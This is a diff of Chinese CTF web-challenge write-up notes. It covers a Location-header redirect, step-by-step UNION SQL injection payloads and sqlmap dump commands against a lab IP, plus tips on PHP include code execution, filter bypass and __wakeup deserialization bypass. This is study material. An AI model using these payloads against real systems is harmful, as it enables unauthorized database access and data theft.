@@ -47,7 +47,7 @@ tags:
 
 **WP**:
 > **【实验原理】**  
-> web请求头中的location作用  
+> web请求头中的`location`作用  
 >   
 > **【实验目的】**  
 > 掌握web响应包头部常见参数  
@@ -60,10 +60,10 @@ tags:
 >   
 > **【实验步骤】**  
 > 1. 根据提示，在url中输入index.php,发现打开的仍然还是1.php
-> 2. 打开火狐浏览器的开发者模式，选择网络模块，再次请求index.php,查看返回包，可以看到location参数被设置了1.php，并且得到flag。
+> 2. 打开火狐浏览器的开发者模式，选择网络模块，再次请求index.php,查看返回包，可以看到`location`参数被设置了1.php，并且得到flag。
 
 **总结**：index.php的响应头如下
-```
+```http
 Connection: Keep-Alive
 Content-Length: 17
 Content-Type: text/html; charset=UTF-8
@@ -74,7 +74,7 @@ Location: 1.php
 Server: Apache/2.4.38 (Debian)
 X-Powered-By: PHP/7.2.21
 ```
-页面自动跳转可能是因为设置了响应的Location头，线索可能在响应头里。2020.2.23.Sun
+页面自动跳转可能是因为设置了响应的`Location`头，线索可能在响应头里。2020.2.23.Sun
 
 ---
 
@@ -84,7 +84,7 @@ X-Powered-By: PHP/7.2.21
 
 **WP**:
 > **目标**  
-> 简单的SQL注入，读取 information_schema 元数据，然后读取flag。
+> 简单的SQL注入，读取`information_schema`元数据，然后读取flag。
 sqlmap 也可解。
 > 
 > **环境**  
@@ -94,28 +94,53 @@ sqlmap 也可解。
 > sqlmap
 > 
 > **分析过程**
-> 1. 初步探测,发现搜索框存在注入 ' union select 1,2,3 #
-> 2. 获取数据库名，表名 ' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #
-> 3. 获取news 表的字段名，数据类型 ' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='news'#
-> 4. 获取f1agfl4gher3 字段名 数据类型 ' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='secret_table'#
-> 5. 得到flag ' and 0 union select 1,2,fl4g from secret_table #
+> 1. 初步探测,发现搜索框存在注入
+>       ```sql
+>       ' union select 1,2,3 #
+>       ```
+> 2. 获取数据库名，表名
+>       ```sql
+>       ' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #
+>       ```
+> 3. 获取news表的字段名，数据类型
+>       ```sql
+>       ' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='news'#
+>       ```
+> 4. 获取f1agfl4gher3字段名 数据类型
+>       ```sql
+>       ' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='secret_table'#
+>       ```
+> 5. 得到flag
+>       ```sql
+>       ' and 0 union select 1,2,fl4g from secret_table #
+>       ```
 > 
 > sqlmap版本
 > 1. 获取注入点
-> sqlmap -u http://192.168.100.161:53459 --data "search=df"
+>       ```bash
+>       sqlmap -u http://192.168.100.161:53459 --data "search=df"
+>       ```
 > 2. 获取数据库信息
-> sqlmap -u http://192.168.100.161:53459 --data "search=df" -dbs
+>       ```sh
+>       sqlmap -u http://192.168.100.161:53459 --data "search=df" -dbs
+>       ```
 > 3. 获取库内表信息
-> sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news --tables
+>       ```sh
+>       sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news --tables
+>       ```
 > 4. 获取表内字段信息
-> sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table --columns
+>       ```bash
+>       sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table --columns
+>       ```
 > 5. 获取字段内容，得到flag
-> sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table -C "fl4g" --dump
+>       ```sh
+>       sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table -C "fl4g" --dump
+>       ```
 
 **总结**：
 
 手动注入：
-1. 单引号找注入点，闭合单引号、用#或“-- ”（两杠后须有空格）注释
+1. 单引号找注入点，闭合单引号、用`#`或“`-- `”（两杠后须有空格）注释
 2. ```order by```测字段数
 3. union select ```information_schema.columns```中的```table_schema```（数据库名）和```tabel_name```（表名），前面加```and 0```清除正常查询出的内容
 4. union select ```information_schema.columns```中的```column_name```和```data_type```获取指定表的字段名和数据类型
@@ -199,9 +224,9 @@ SQLMAP使用：
 **总结**：
 1. 本题中先利用被echo的参数把要执行的PHP代码输出到当前页面上（记得带上```<?php ?>```或```<? ?>```），再用被include的参数来包含当前页面；
 2. ```strstr```（判断字符串中是否包含某子串）可用大小写绕过；
-3. ```file_get_contents```8行的时候可尝试```show_source```
+3. ```file_get_contents```不行的时候可尝试```show_source```
 4. include的url要包含协议
-5. 可通过phpinfo查看system之类的敏感函数是否被禁用  2020.7.31.Fri
+5. 可通过`phpinfo`查看`system`之类的敏感函数是否被禁用  2020.7.31.Fri
 
 ---
 
@@ -342,7 +367,7 @@ SQLMAP使用：
 
 **总结**：
 1. 执行`unserialize()`时，当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过`__wakeup()`
-2. 本题中将最前面表示对象类型的“O”改成小写“o”或者改各个长度和类型字段也行  2020.8.26.Wed
+2. 本题中将最前面表示对象类型的`O`改成小写`o`或者改各个长度和类型字段也行  2020.8.26.Wed
 
 
 _//未完待xu_
